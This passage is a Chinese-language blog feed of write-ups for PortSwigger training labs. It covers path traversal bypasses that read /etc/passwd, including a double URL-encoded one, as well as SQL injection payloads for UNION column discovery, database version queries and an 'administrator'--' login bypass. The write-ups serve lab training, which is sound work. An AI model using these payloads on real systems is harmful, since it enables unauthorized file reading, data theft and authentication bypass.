&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-validate-start-of-path-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>请求内容同&lt;a href="/portswigger-posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
&lt;li>但不同于前题，题目中提到&lt;code>The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.&lt;/code>，此题的图片资源请求路径为&lt;code>/image?filename=/var/www/images/xx.jpg&lt;/code>，需要以&lt;code>/var/www/images&lt;/code>为起始路径&lt;/li>
&lt;li>最终url为&lt;code>/image?filename=/var/www/images/../../../etc/passwd&lt;/code>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</title><link>/portswigger-posts/file-path-traversal-lab-superfluous-url-decode/</link><pubDate>Thu, 28 Nov 2024 22:53:46 +0800</pubDate><guid>/portswigger-posts/file-path-traversal-lab-superfluous-url-decode/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-superfluous-url-decode-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-superfluous-url-decode-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>请求内容同&lt;a href="/portswigger-posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
&lt;li>但不同于前题，题目中提到&lt;code>The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.&lt;/code>&lt;/li>
&lt;li>url编码对应如下
&lt;ul>
&lt;li>&lt;code>.&lt;/code>: %2e&lt;/li>
&lt;li>&lt;code>/&lt;/code>: %2f&lt;/li>
&lt;li>&lt;code>%&lt;/code>: %25&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>参考上述编码&lt;code>../../../etc/passwd&lt;/code>的url编码为&lt;code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd&lt;/code>&lt;/li>
&lt;li>最终url为&lt;code>/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd&lt;/code>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences stripped non-recursively</title><link>/portswigger-posts/file-path-traversal-lab-sequences-stripped-non-recursively/</link><pubDate>Thu, 28 Nov 2024 22:26:34 +0800</pubDate><guid>/portswigger-posts/file-path-traversal-lab-sequences-stripped-non-recursively/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-sequences-stripped-non-recursively-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-sequences-stripped-non-recursively-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>请求内容同&lt;a href="/portswigger-posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
&lt;li>但不同于前题，题目中提到&lt;code>The application strips path traversal sequences from the user-supplied filename before using it.&lt;/code>&lt;/li>
&lt;li>最终url为&lt;code>/image?filename=....//....//....//etc//passwd&lt;/code>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, traversal sequences blocked with absolute path bypass</title><link>/portswigger-posts/file-path-traversal-lab-absolute-path-bypass/</link><pubDate>Thu, 28 Nov 2024 22:06:08 +0800</pubDate><guid>/portswigger-posts/file-path-traversal-lab-absolute-path-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-absolute-path-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-absolute-path-bypass-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>请求内容同&lt;a href="/portswigger-posts/file-path-traversal-lab-simple/">前题&lt;/a>，且题目中也提到图片资源请求中包含路径遍历漏洞&lt;/li>
&lt;li>但不同于前题，题目中提到&lt;code>The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.&lt;/code>&lt;/li>
&lt;li>最终url为&lt;code>/image?filename=/etc/passwd&lt;/code>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, simple case</title><link>/portswigger-posts/file-path-traversal-lab-simple/</link><pubDate>Thu, 28 Nov 2024 21:24:48 +0800</pubDate><guid>/portswigger-posts/file-path-traversal-lab-simple/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-simple-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-simple-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用Burp suite观察此Lab，会发现有许多图片资源请求
&lt;img alt="Lab description" src="/img/2024/file-path-traversal-lab-simple-2.jpg">&lt;/li>
&lt;li>题目中明确提到图片资源请求中包含路径遍历漏洞，所以尝试在请求url的&lt;code>filename&lt;/code>参数前段不断新增&lt;code>../&lt;/code>便可达成目的；最终url为&lt;code>/image?filename=../../../etc/passwd&lt;/code>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>/portswigger-posts/sql-injection-lab-querying-database-version-mysql-microsoft/</link><pubDate>Wed, 27 Nov 2024 21:04:57 +0800</pubDate><guid>/portswigger-posts/sql-injection-lab-querying-database-version-mysql-microsoft/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>推测SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
&lt;li>此题需要通过UNION 注入攻击获取MySQL、Microsoft数据库的类型和版本&lt;/li>
&lt;li>UNION 注入攻击需要以下三步
&lt;ol>
&lt;li>判断列数
&lt;ol>
&lt;li>使用&lt;code>order by n&lt;/code>语句不断累加n，n累加到3时报错，所以判断SQL query的返回列数为2&lt;/li>
&lt;li>url为&lt;code>/filter?category=Gifts' order by 2#&lt;/code>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>判断显示位
&lt;ol>
&lt;li>url为&lt;code>/filter?category=Gifts' union select 'a1','a2'%23&lt;/code>
&lt;ul>
&lt;li>&lt;code>%23&lt;/code>为&lt;code>#&lt;/code>的URL 编码，通过浏览器发送url时需要进行编码；通过Burp Suite时Burp Suite会自动进行编码
&lt;img alt="Determine the display position" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-2.jpg">&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>获取目标数据
&lt;ol>
&lt;li>根据&lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>，MySQL、Microsoft数据库的类型和版本获取方式为&lt;code>SELECT @@version&lt;/code>&lt;/li>
&lt;li>url为&lt;code>/filter?category=Gifts' union select @@version,null%23&lt;/code>
&lt;img alt="Retrieve the target data" src="/img/2024/sql-injection-lab-querying-database-version-mysql-microsoft-3.jpg">&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection UNION attack, finding a column containing text</title><link>/portswigger-posts/sql-injection-lab-find-column-containing-text/</link><pubDate>Tue, 26 Nov 2024 22:34:27 +0800</pubDate><guid>/portswigger-posts/sql-injection-lab-find-column-containing-text/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-find-column-containing-text-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>根据&lt;a href="/portswigger-posts/sql-injection-lab-determine-number-of-columns/">前题&lt;/a>，SQL query为SELECT * FROM table WHERE category = &amp;lsquo;&lt;!-- raw HTML omitted -->&amp;rsquo;，且返回字段数为3&lt;/li>
&lt;li>此题需要将题目给出的随机字符串注入至SQL query所返回的字段内容中&lt;/li>
&lt;li>解题的url为&lt;code>filter?category=Lifestyle' UNION (select null, '&amp;lt;随机字符串&amp;gt;', null)--&lt;/code>
&lt;ul>
&lt;li>例如随机字符串为&lt;code>VGs2z9&lt;/code>，所以url为&lt;code>filter?category=Lifestyle' UNION (select null, 'VGs2z9', null)--&lt;/code>
&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-find-column-containing-text-2.jpg">&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>/portswigger-posts/sql-injection-lab-determine-number-of-columns/</link><pubDate>Mon, 25 Nov 2024 23:02:48 +0800</pubDate><guid>/portswigger-posts/sql-injection-lab-determine-number-of-columns/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-determine-number-of-columns-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-determine-number-of-columns-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>同前题，SQL query为&lt;code>SELECT * FROM table WHERE category = '&amp;lt;category&amp;gt;'&lt;/code>&lt;/li>
&lt;li>此题需要获取SQL query所返回的字段数量，有两种方法
&lt;ol>
&lt;li>使用&lt;code>UNION (select null, null...)--&lt;/code>，不断新增&lt;code>null,&lt;/code>，直到不返回报错(Internal Server Error)&lt;/li>
&lt;li>使用&lt;code>ORDER BY n--&lt;/code>，不断递减n，直到不返回报错(Internal Server Error)&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>使用方法1，解题的url为&lt;code>filter?category=Accessories'+UNION+(select+null,+null,+null)--&lt;/code>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection attack, querying the database type and version on Oracle</title><link>/portswigger-posts/sql-injection-lab-querying-database-version-oracle/</link><pubDate>Sun, 24 Nov 2024 12:37:06 +0800</pubDate><guid>/portswigger-posts/sql-injection-lab-querying-database-version-oracle/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-querying-database-version-oracle-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>推测SQL query为&lt;code>SELECT * FROM table WHERE category = &amp;lt;category&amp;gt;&lt;/code>&lt;/li>
&lt;li>此题需要通过UNION 注入攻击获取Oracle数据库的类型和版本&lt;/li>
&lt;li>UNION 注入攻击需要以下三步
&lt;ol>
&lt;li>判断列数
&lt;ol>
&lt;li>使用&lt;code>order by n&lt;/code>语句不断累加n，n累加到3时报错，所以判断SQL query的返回列数为2&lt;/li>
&lt;li>url为&lt;code>filter?category=Accessories'+order+by+2--&lt;/code>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>判断显示位
&lt;ol>
&lt;li>根据题目Hit，Oracle数据库中的&lt;code>SELECT&lt;/code>语句必须指定&lt;code>FROM&lt;/code>，可以使用Oracle内置的DUAL表来达成目的&lt;/li>
&lt;li>url为&lt;code>filter?category=Accessories'+union+select+'a1',+'a2'+from+dual+--&lt;/code>
&lt;img alt="Determine the display position" src="/img/2024/sql-injection-lab-querying-database-version-oracle-2.jpg">&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>获取目标数据
&lt;ol>
&lt;li>根据&lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>，Oracle数据库的类型和版本获取方式为&lt;code>SELECT banner FROM v$version&lt;/code>&lt;/li>
&lt;li>url为&lt;code>filter?category=Accessories'+union+select+banner,+null+from+v$version+--&lt;/code>
&lt;img alt="Retrieve the target data" src="/img/2024/sql-injection-lab-querying-database-version-oracle-3.jpg">&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection vulnerability allowing login bypass</title><link>/portswigger-posts/sql-injection-lab-login-bypass/</link><pubDate>Sat, 23 Nov 2024 22:46:24 +0800</pubDate><guid>/portswigger-posts/sql-injection-lab-login-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击My account后看到登录画面
&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-2.jpg">&lt;/li>
&lt;li>根据题目此登录逻辑包含SQL注入问题，猜测后端的SQL query为&lt;code>SELECT * FROM users WHERE username = '&amp;lt;username&amp;gt;' AND password = '&amp;lt;password&amp;gt;'&lt;/code>，如何将&lt;code>AND&lt;/code>之后的查询条件隐去，为此题的目标&lt;/li>
&lt;li>通过&lt;code>&amp;lt;username&amp;gt;&lt;/code>将后面SQL query去除，尝试使用&lt;code>administrator'--&lt;/code>作为参数传入，将后端的SQL qeruy变为&lt;code>SELECT * FROM users WHERE username = 'administrator'--' AND password = '&amp;lt;password&amp;gt;'&lt;/code>
&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-3.jpg">&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</title><link>/portswigger-posts/sql-injection-lab-retrieve-hidden-data/</link><pubDate>Sat, 23 Nov 2024 20:15:04 +0800</pubDate><guid>/portswigger-posts/sql-injection-lab-retrieve-hidden-data/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-retrieve-hidden-data-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-retrieve-hidden-data-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击&lt;code>Refine your search:&lt;/code>时，观察url的变化，例如点击&lt;code>Corporate gifts&lt;/code>时，url为&lt;code>/filter?category=Corporate+gifts&lt;/code>&lt;/li>
&lt;li>根据描述中的SQL query得知，&lt;code>category&lt;/code>的参数值将透传给SQL category的比较值；但是SQL query中在后续还有查询条件&lt;code>AND released = 1&lt;/code>，所以使用&lt;code>category&lt;/code>的参数值影响SQL query，将后续的查询条件去除，为破题所在&lt;/li>
&lt;li>尝试在url后面&lt;code>+or+1=1--&lt;/code>进行查询，根据页面回显，发现SQL query没有闭合，所以SQL query没有受到影响
&lt;img alt="url-1" src="/img/2024/sql-injection-lab-retrieve-hidden-data-2.jpg">&lt;/li>
&lt;li>新增单引号&lt;code>'&lt;/code>将SQL query闭合，完整url为&lt;code>filter?category=Corporate+gifts'+or+1=1--&lt;/code>，发送请求后，即可看到全部的商品
&lt;img alt="url-2" src="/img/2024/sql-injection-lab-retrieve-hidden-data-3.jpg">&lt;/li>
&lt;/ol></content></item></channel></rss>